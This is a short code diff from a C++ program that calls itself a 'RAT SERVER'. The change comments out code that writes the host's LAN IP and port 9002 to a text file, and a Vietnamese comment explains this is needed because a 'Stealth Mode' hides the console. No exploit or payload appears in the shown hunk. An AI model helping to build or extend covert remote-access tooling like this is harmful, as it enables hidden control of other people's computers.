@@ -259,16 +259,16 @@ int main() {
     ULONG_PTR gdiplusToken;
     GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);
 
-    std::string myIP = GetLocalIPAddress();
-    std::cout << ">>> DETECTED LAN IP: " << myIP << std::endl;
-    // Ghi ra file để xem(vì Stealth Mode sẽ ẩn console)
-    std::ofstream ipFile("server_ip.txt");
-    if (ipFile.is_open()) {
-        ipFile << "Server IP Address: " << myIP << "\n";
-        ipFile << "Port: 9002\n";
-        ipFile << "Copy IP nay va nhap vao Web Client.";
-        ipFile.close();
-    }
+    //std::string myIP = GetLocalIPAddress();
+    //std::cout << ">>> DETECTED LAN IP: " << myIP << std::endl;
+    //// Ghi ra file để xem(vì Stealth Mode sẽ ẩn console)
+    //std::ofstream ipFile("server_ip.txt");
+    //if (ipFile.is_open()) {
+    //    ipFile << "Server IP Address: " << myIP << "\n";
+    //    ipFile << "Port: 9002\n";
+    //    ipFile << "Copy IP nay va nhap vao Web Client.";
+    //    ipFile.close();
+    //}
 
     std::cout << "==========================================" << std::endl;
     std::cout << "   RAT SERVER                             " << std::endl;
